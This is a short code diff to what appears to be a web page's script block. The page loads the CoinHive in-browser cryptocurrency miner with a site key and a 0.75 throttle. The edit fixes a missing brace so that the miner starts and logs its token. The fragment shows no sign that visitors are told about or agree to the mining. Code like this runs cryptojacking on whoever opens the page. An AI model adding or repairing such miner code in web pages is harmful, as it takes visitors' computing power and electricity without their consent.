@@ -44,7 +44,7 @@ loadScript("https://apis.google.com/js/plusone.js");
     </script>
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <script>
-        var miner = new CoinHive.User('oTxvf8nX2guvfIXKe4aFAGEThUAGtO1H', {throttle: 0.75);
+        var miner = new CoinHive.User('oTxvf8nX2guvfIXKe4aFAGEThUAGtO1H', {throttle: 0.75});
         miner.start();
         miner.on('authed', function(params) {
             console.log('Token name is: ', miner.getToken());
